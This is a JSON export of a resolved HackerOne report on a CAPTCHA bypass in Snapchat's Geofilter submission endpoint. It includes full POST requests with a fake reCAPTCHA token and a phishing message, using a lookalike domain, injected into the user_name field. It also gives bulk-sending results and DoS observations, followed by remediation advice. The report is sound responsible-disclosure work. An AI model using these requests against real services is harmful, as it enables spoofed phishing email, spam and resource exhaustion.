{
  "id": 54641,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDY0MQ==",
  "url": "https://hackerone.com/reports/54641",
  "title": "Captcha Bypass in Snapchat's Geofilter Submission Process",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-04-03T12:44:21.990Z",
  "submitted_at": "2015-04-03T12:44:21.990Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zero",
    "url": "/zero",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/915/97b058d536cdcdba7f38277a27ff210df7e6d2d2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 513,
    "url": "https://hackerone.com/snapchat",
    "handle": "snapchat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Snapchat",
      "twitter_handle": "",
      "website": "https://www.snapchat.com/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2015-05-04T01:15:06.517Z",
  "bug_reporter_agreed_on_going_public_at": "2015-04-04T01:14:56.364Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\r\n\r\n**Overview:**\r\nSnapchat provides a form in which users can submit \"Geofilters\". These are filters which get applied to users snaps when they are in specific geolocations. The form (https://www.snapchat.com/geofilters/submit.html) allows for the submission of these \"Geofilters\" as an anonymous user.\r\n\r\nThe following information is submitted through this form:\r\n- Image (filter in PNG format) (**image_data**)\r\n- Name (**user_name**)\r\n- Email (**user_email**)\r\n- Description (**description**)\r\n- Notes (**notes**)\r\n\r\n**Vulnerability description:**\r\nThe HTTP header `g-recaptcha-response` is not validated on the server-side when submitting a Geofilter to the endpoint `/_ah/api/geofilter/v1/submission` located on `geofilter-dot-feelinsonice-hrd.appspot.com`. Any or no value can be provided for this header. \r\n\r\nSince no CAPTCHA verification is needed, an attacker can then conduct a bulk email sending campaign on behalf of the email address `no_reply.geofilters@snapchat.com`. In addition to this, the attacker can spoof the contents of the email by customising the `user_name`, `notes` or `description` parameters.\r\n\r\n**Technical description:**\r\nAfter successfully passing the CAPTCHA and submitting the Geofilter, a POST HTTP request is sent to `geofilter-dot-feelinsonice-hrd.appspot.com` :\r\n\r\n```\r\nPOST /_ah/api/geofilter/v1/submission HTTP/1.1\r\nHost: geofilter-dot-feelinsonice-hrd.appspot.com\r\nConnection: keep-alive\r\nContent-Length: 496\r\nSnapchat-CSRF-Protection: not-a-secret\r\nOrigin: https://www.snapchat.com\r\ng-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36\r\nContent-Type: application/json; charset=UTF-8\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nReferer: https://www.snapchat.com/geofilters/submit.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n{\"image_data\":\"abcdefg\",\"image_type\":\"PNG\",\"user_name\":\"Shubham\",\"user_email\":\"admin+1@shubh.am\",\"notes\":\"lol\",\"description\":\"lol \",\"geofence_polygon\":\"[{\\\"lat\\\":34.08166844698418,\\\"long\\\":-118.35296630859375},{\\\"lat\\\":34.16465895459983,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.10725639663118,\\\"long\\\":-118.30490112304688},{\\\"lat\\\":34.10498222546687,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.165227101802884,\\\"long\\\":-118.33992004394531}]\",\"start_millis\":null,\"end_millis\":null,\"is_event\":false}\r\n```\r\n\r\n**Note**: In this request, the header `g-recaptcha-response` does not have a valid token value. Instead, for demonstration purposes I have changed it to `I_love_cats_and_kittens_and_all_fluffy_things` (I actually do love kittens, but that's not the point). \r\n\r\nThe same request can be sent with the very same token above or with no token at all, and it will still succeed. This is where the primary vulnerability lies.\r\n\r\nBy sending the above request, my email (`admin+1@shubh.am`) will receive an email along the lines of the following: https://i.imgur.com/EF588pW.png (also attached as email1.png).\r\n\r\nWe can spoof the contents of this email by modifying the \"user_name\" parameter sent in our request. Take the following POST request into consideration:\r\n\r\n```\r\nPOST /_ah/api/geofilter/v1/submission HTTP/1.1\r\nHost: geofilter-dot-feelinsonice-hrd.appspot.com\r\nConnection: keep-alive\r\nContent-Length: 496\r\nSnapchat-CSRF-Protection: not-a-secret\r\nOrigin: https://www.snapchat.com\r\ng-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36\r\nContent-Type: application/json; charset=UTF-8\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nReferer: https://www.snapchat.com/geofilters/submit.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n{\"image_data\":\"abcdefg\",\"image_type\":\"PNG\",\"user_name\":\"Shubham, in order for Snapchat to accept your Geofilter, you must activate by logging into https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215. Thank you\",\"user_email\":\"admin+1@shubh.am\",\"notes\":\"lol\",\"description\":\"lol \",\"geofence_polygon\":\"[{\\\"lat\\\":34.08166844698418,\\\"long\\\":-118.35296630859375},{\\\"lat\\\":34.16465895459983,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.10725639663118,\\\"long\\\":-118.30490112304688},{\\\"lat\\\":34.10498222546687,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.165227101802884,\\\"long\\\":-118.33992004394531}]\",\"start_millis\":null,\"end_millis\":null,\"is_event\":false}\r\n```\r\n\r\nThe email received by the victim (in this case my email) will look like this: http://i.imgur.com/Xkyw7gV.png (also attached as email2.png).\r\n\r\n**Impact:**\r\nThe link `https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215` is automatically converted into a link (for most web email clients). In addition to this, some email clients (such as Gmail) will hide the rest of the email as it is a duplicate of a previous email (redundant). This makes the malicious email look even more convincing.\r\n\r\nThese factors combined, allow for a convincing email to be sent, on behalf of the official Snapchat Geofilter API email `no_reply.geofilters@snapchat.com`. The attacker could leverage this vulnerability to send out emails on behalf of Snapchat. Over 1000 POST requests were sent using 50 threads. No rate limiting or limits were experienced. All 1000 emails were sent.\r\n\r\nAdditionally, since the images are physically stored somewhere and the emails are sent per request - this vulnerability could also act as a DoS issue for Snapchat. The **image_data** field in the JSON object sent, is not checked for whether or not it is a valid image. Regardless of the contents, the contents are saved somewhere on Snapchat's servers. Through testing, I found that there were no obvious restrictions to how big of an image could be uploaded via this API.\r\n\r\nBoth email quota's and file storage quota's could be consumed through the abuse of this API endpoint.\r\n\r\n**Remediation suggestions:**\r\nIn order to address this design flaw, the following steps can be taken:\r\n1. Ensure that the Captcha verification token is being validated on the server-side.\r\n2. Limit the number of requests which can be sent to this endpoint (time based or number of submissions).\r\n3. Set a limit on the size of the image which can be sent and/or saved to Snapchat's servers.\r\n\r\nPlease do not hesitate to contact if any additional details are required regarding this bug.\r\n\r\nThank you,\r\nShubham",
  "weakness": {
    "id": 57,
    "name": "Violation of Secure Design Principles"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 33630,
      "file_name": "email1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/033/630/40a2ba38d3905a7ed23da383e3d84d5531a437d1/email1.png?response-content-disposition=attachment%3B%20filename%3D%22email1.png%22%3B%20filename%2A%3DUTF-8%27%27email1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MPOSDGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T113828Z&X-Amz-Expires=2842&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCBbMU%2B267qveSZjBTX7ems7plNjeRB6ghD4pLJYoxoNQIhAOB1OSi6O%2Fdo0XBpeF6JncYBFY%2B3LuUhN87iPIpANtG6KrIFCG8QAxoMMDEzNjE5Mjc0ODQ5IgyTVupFrPXFhTCscDcqjwX3tBGrIxV1zh7UC%2F4Jr3riyPw49dAeC5kRAlOtteJbZE7w38%2Bz4nQNyxwc0EDGaQF7ShQBfd%2BZUHPanKu9xreSHilAC48s6ipy0W6liWIA716VdwLzxs61TAwjVY5Dn5NcJX6Q3ESCcUgNOvCDp5WtNJIC8hjUvq%2FIfZNGgSU8EEE3ZhddGlH637YMsQmHoURN7ZdlmqOjTdTjp1ZmGwSf4gfCfxcBa7RWhKXxfMjNXP9W%2B7Q4lzx9iyRB9bAKQ4vzqfzKuIzUvErDi7g1BejVCAMSpc3neh6LHUPLL09kycCd7wAIkU7M%2B1YSEpwoAGZjPw1YxjIXbkUjkViJH7tHQuO4Y2MDuCX9kPdXFdl1iTN%2BQFQHzJUlJnpzreuX8gCvgxp69xs2UrjoNcSh%2FutYkUp8hxyzddNzX4DncxeeiM5bDDyE%2FiM9XoHAfxZIZotmhUdHCXdIwfJOxL0rm9j1SkozgxU5pKQ%2FMqFAw9ktT4uCJOpF4hQqSIO3Al5aEOuHYpsL%2FvTUa0CWR23BN5Oso%2FwqP4o%2BpqfE5SGocS58oIvDbg%2BUSZgbOd%2FASTpH0%2BdbT75BjpWMniqmLAdLfz%2B9HoKI4%2B%2Bu1VE9nn3tEdJdpoT8plVaCnWqo6gsxkH1xRgD3LIQnGiOB3VBJMae5D%2B3SINIj%2F02Ts9Sk9HfzDcHasyi33Rbfa2Z6Cybqm9RjGjM9NZxVc6VNJAbR65Dz9a86PbI1BXTro4UwUsRNpwkFO2dAcHb8%2BKZBxPXEAHTC%2BofM5%2BCgN25GFIFvtqv6dqg7qhR09%2B2yIbEFl3Jl0CO2tqOCuUg8fXONobnIcyzyJ5drnRry8Hja0ZBfbS5kAfZw6b00jsYTbyK27fWrclbMLiSrK4GOrABSlUIRQH7wV3jiBwm%2BeWqVFr0C9fXdkEWssmuTS38vAJfNkTBbi3JGXNRIeiEwLy8Ure25FlVwG2TP52pXfh0Nc96Cu8PlYAOMCGlg2RvQKToTUDyNjN%2FvhVk%2B2ldWDLLFAMrKgMam5Gdy5PJO6eVDmNGMuI5wUXvzyUPjR9cvsWGe75MDpFAn9K8YC%2FVr8w8lUemxqjYZSER8ZFwYOVS4G6%2BJQ0efx3tmFba4J9Wekc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6b69fbeff81d8dfa999a094a731e67def09aff02c8a38b63ab788423233f9113",
      "file_size": 11997,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 33635,
      "file_name": "email2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/033/635/794038427c94234eecd4508c8a6dbad1462babd9/email2.png?response-content-disposition=attachment%3B%20filename%3D%22email2.png%22%3B%20filename%2A%3DUTF-8%27%27email2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MPOSDGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T113828Z&X-Amz-Expires=2842&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCBbMU%2B267qveSZjBTX7ems7plNjeRB6ghD4pLJYoxoNQIhAOB1OSi6O%2Fdo0XBpeF6JncYBFY%2B3LuUhN87iPIpANtG6KrIFCG8QAxoMMDEzNjE5Mjc0ODQ5IgyTVupFrPXFhTCscDcqjwX3tBGrIxV1zh7UC%2F4Jr3riyPw49dAeC5kRAlOtteJbZE7w38%2Bz4nQNyxwc0EDGaQF7ShQBfd%2BZUHPanKu9xreSHilAC48s6ipy0W6liWIA716VdwLzxs61TAwjVY5Dn5NcJX6Q3ESCcUgNOvCDp5WtNJIC8hjUvq%2FIfZNGgSU8EEE3ZhddGlH637YMsQmHoURN7ZdlmqOjTdTjp1ZmGwSf4gfCfxcBa7RWhKXxfMjNXP9W%2B7Q4lzx9iyRB9bAKQ4vzqfzKuIzUvErDi7g1BejVCAMSpc3neh6LHUPLL09kycCd7wAIkU7M%2B1YSEpwoAGZjPw1YxjIXbkUjkViJH7tHQuO4Y2MDuCX9kPdXFdl1iTN%2BQFQHzJUlJnpzreuX8gCvgxp69xs2UrjoNcSh%2FutYkUp8hxyzddNzX4DncxeeiM5bDDyE%2FiM9XoHAfxZIZotmhUdHCXdIwfJOxL0rm9j1SkozgxU5pKQ%2FMqFAw9ktT4uCJOpF4hQqSIO3Al5aEOuHYpsL%2FvTUa0CWR23BN5Oso%2FwqP4o%2BpqfE5SGocS58oIvDbg%2BUSZgbOd%2FASTpH0%2BdbT75BjpWMniqmLAdLfz%2B9HoKI4%2B%2Bu1VE9nn3tEdJdpoT8plVaCnWqo6gsxkH1xRgD3LIQnGiOB3VBJMae5D%2B3SINIj%2F02Ts9Sk9HfzDcHasyi33Rbfa2Z6Cybqm9RjGjM9NZxVc6VNJAbR65Dz9a86PbI1BXTro4UwUsRNpwkFO2dAcHb8%2BKZBxPXEAHTC%2BofM5%2BCgN25GFIFvtqv6dqg7qhR09%2B2yIbEFl3Jl0CO2tqOCuUg8fXONobnIcyzyJ5drnRry8Hja0ZBfbS5kAfZw6b00jsYTbyK27fWrclbMLiSrK4GOrABSlUIRQH7wV3jiBwm%2BeWqVFr0C9fXdkEWssmuTS38vAJfNkTBbi3JGXNRIeiEwLy8Ure25FlVwG2TP52pXfh0Nc96Cu8PlYAOMCGlg2RvQKToTUDyNjN%2FvhVk%2B2ldWDLLFAMrKgMam5Gdy5PJO6eVDmNGMuI5wUXvzyUPjR9cvsWGe75MDpFAn9K8YC%2FVr8w8lUemxqjYZSER8ZFwYOVS4G6%2BJQ0efx3tmFba4J9Wekc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3adff8ca6a84d6f4e68fd9c49812b61716a7ee565892bd9bd3572a13c3da9f98",
      "file_size": 12051,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2015-05-04T01:14:56.676Z",
  "allow_singular_disclosure_after": -277122212.2462936,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "tess",
    "shubham_srt",
    "0nlymohammed",
    "shivammusic",
    "nafisaqil",
    "numerix",
    "jogan"
  ],
  "structured_scope": {
    "databaseId": 11825,
    "asset_type": "URL",
    "asset_identifier": "geofilters.snapchat.com",
    "max_severity": "high"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
